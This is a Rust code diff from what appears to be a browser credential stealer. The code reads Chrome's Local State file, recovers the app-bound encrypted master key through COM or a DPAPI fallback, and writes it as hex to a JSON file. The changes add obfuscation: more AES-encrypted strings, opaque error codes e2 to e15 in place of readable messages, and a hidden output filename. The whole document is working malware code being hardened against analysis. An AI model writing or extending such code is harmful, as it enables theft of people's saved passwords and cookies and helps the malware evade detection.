@@ -18,15 +18,19 @@ use std::{path::PathBuf};
 
 use crate::xor::{aes_str, aes_dec};
 use crate::xor::{
-    K32_DLL_KEY,        K32_DLL_NONCE,        K32_DLL_CT,
-    CREATE_THREAD_KEY,  CREATE_THREAD_NONCE,  CREATE_THREAD_CT,
-    APPDATA_ENV_KEY,    APPDATA_ENV_NONCE,    APPDATA_ENV_CT,
-    LOCAL_ENV_KEY,      LOCAL_ENV_NONCE,      LOCAL_ENV_CT,
-    LOCAL_STATE_KEY,    LOCAL_STATE_NONCE,    LOCAL_STATE_CT,
-    APP_BOUND_KEY_KEY,  APP_BOUND_KEY_NONCE,  APP_BOUND_KEY_CT,
-    RESULT_ENV_KEY,     RESULT_ENV_NONCE,     RESULT_ENV_CT,
-    USER_DATA_ENV_KEY,  USER_DATA_ENV_NONCE,  USER_DATA_ENV_CT,
-    DATA_ROOT_ENV_KEY,  DATA_ROOT_ENV_NONCE,  DATA_ROOT_ENV_CT,
+    K32_DLL_KEY,           K32_DLL_NONCE,           K32_DLL_CT,
+    CREATE_THREAD_KEY,     CREATE_THREAD_NONCE,     CREATE_THREAD_CT,
+    APPDATA_ENV_KEY,       APPDATA_ENV_NONCE,       APPDATA_ENV_CT,
+    LOCAL_ENV_KEY,         LOCAL_ENV_NONCE,         LOCAL_ENV_CT,
+    LOCAL_STATE_KEY,       LOCAL_STATE_NONCE,       LOCAL_STATE_CT,
+    APP_BOUND_KEY_KEY,     APP_BOUND_KEY_NONCE,     APP_BOUND_KEY_CT,
+    RESULT_ENV_KEY,        RESULT_ENV_NONCE,        RESULT_ENV_CT,
+    USER_DATA_ENV_KEY,     USER_DATA_ENV_NONCE,     USER_DATA_ENV_CT,
+    DATA_ROOT_ENV_KEY,     DATA_ROOT_ENV_NONCE,     DATA_ROOT_ENV_CT,
+    JSON_KEY_BROWSER_KEY,  JSON_KEY_BROWSER_NONCE,  JSON_KEY_BROWSER_CT,
+    JSON_KEY_MASTER_KEY,   JSON_KEY_MASTER_NONCE,   JSON_KEY_MASTER_CT,
+    JSON_KEY_ERROR_KEY,    JSON_KEY_ERROR_NONCE,    JSON_KEY_ERROR_CT,
+    RESULT_FALLBACK_KEY,   RESULT_FALLBACK_NONCE,   RESULT_FALLBACK_CT,
 };
 
 type BOOL = i32;
@@ -103,7 +107,7 @@ fn run() -> Result<(), String> {
     let local_state_path = resolve_local_state_path(&exe)?;
 
     let raw = std::fs::read_to_string(&local_state_path)
-        .map_err(|e| format!("read Local State: {e}"))?;
+        .map_err(|_| "e2".to_string())?;
 
     let key_b64 = {
         let app_key_name = aes_str(APP_BOUND_KEY_CT, &APP_BOUND_KEY_KEY, &APP_BOUND_KEY_NONCE);
@@ -113,10 +117,10 @@ fn run() -> Result<(), String> {
             if let Some(end) = raw[start..].find('"') {
                 raw[start..start + end].to_string()
             } else {
-                return Err(format!("unterminated {}", app_key_name)).into();
+                return Err("e3".to_string());
             }
         } else {
-            return Err(format!("{} not found", app_key_name)).into();
+            return Err("e4".to_string());
         }
     };
 
@@ -124,13 +128,13 @@ fn run() -> Result<(), String> {
         &base64::engine::general_purpose::STANDARD,
         &key_b64,
     )
-    .map_err(|e| format!("base64 decode: {e}"))?;
+    .map_err(|_| "e5".to_string())?;
 
     if encrypted_key.len() < 4 {
-        return Err("encrypted key too short".into());
+        return Err("e6".to_string());
     }
     if !encrypted_key.starts_with(APPB) {
-        return Err("missing APPB prefix on app_bound_encrypted_key".into());
+        return Err("e7".to_string());
     }
     let encrypted_key = &encrypted_key[4..];
 
@@ -145,25 +149,24 @@ fn run() -> Result<(), String> {
 
     let master_key = com_result.or_else(|_| {
         let r = dpflbck::try_decrypt_app_bound(encrypted_key);
-        r.ok_or_else(|| String::from("dpapi fallback failed"))
+        r.ok_or_else(|| "e8".to_string())
     })
-    .map_err(|e| format!("key recovery: {e}"))?;
+    .map_err(|_| "e9".to_string())?;
 
     if master_key.len() != 32 {
-        return Err(format!(
-            "unexpected key length: {} (want 32)",
-            master_key.len()
-        ));
+        return Err("e10".to_string());
     }
 
     let hex_str: String = master_key.iter().map(|b| format!("{b:02x}")).collect();
+    let jk_browser = aes_str(JSON_KEY_BROWSER_CT, &JSON_KEY_BROWSER_KEY, &JSON_KEY_BROWSER_NONCE);
+    let jk_master  = aes_str(JSON_KEY_MASTER_CT,  &JSON_KEY_MASTER_KEY,  &JSON_KEY_MASTER_NONCE);
     let json = format!(
-        "{{\"browser\":\"{}\",\"master_key_hex\":\"{}\"}}",
+        "{{\"{jk_browser}\":\"{}\",\"{jk_master}\":\"{}\"}}",
         browser_label, hex_str
     );
 
     let path = result_path();
-    std::fs::write(&path, &json).map_err(|e| format!("write result: {e}"))?;
+    std::fs::write(&path, &json).map_err(|_| "e11".to_string())?;
     Ok(())
 }
 
@@ -183,24 +186,21 @@ fn resolve_local_state_path(exe: &str) -> Result<PathBuf, String> {
         if path.exists() {
             return Ok(path);
         }
-        return Err(format!("Local State not found: {}", path.display()));
+        return Err("e12".to_string());
     }
 
     let browser = elv::resolve_browser(exe)
-        .ok_or_else(|| format!("could not detect browser from exe path: {exe}"))?;
+        .ok_or_else(|| "e13".to_string())?;
 
     let local_appdata =
-        std::env::var(&local_name).map_err(|_| "")?;
+        std::env::var(&local_name).map_err(|_| "e14".to_string())?;
 
     let local_state_path = PathBuf::from(&local_appdata)
         .join(browser.user_data_rel)
         .join(&ls_name);
 
     if !local_state_path.exists() {
-        return Err(format!(
-            "Local State not found: {}",
-            local_state_path.display()
-        ));
+        return Err("e15".to_string());
     }
     Ok(local_state_path)
 }
@@ -209,11 +209,13 @@ fn result_path() -> PathBuf {
     if let Some(p) = get_env(RESULT_ENV_CT, &RESULT_ENV_KEY, &RESULT_ENV_NONCE) {
         return PathBuf::from(p);
     }
-    std::env::temp_dir().join("chrome_recovery_result.json")
+    let fallback = aes_str(RESULT_FALLBACK_CT, &RESULT_FALLBACK_KEY, &RESULT_FALLBACK_NONCE);
+    std::env::temp_dir().join(fallback)
 }
 
 fn write_error(msg: &str) {
-    let json = format!("{{\"error\":\"{}\"}}", msg);
+    let jk_error = aes_str(JSON_KEY_ERROR_CT, &JSON_KEY_ERROR_KEY, &JSON_KEY_ERROR_NONCE);
+    let json = format!("{{\"{jk_error}\":\"{msg}\"}}");
     let p = result_path();
     let _ = std::fs::write(&p, &json);
 }
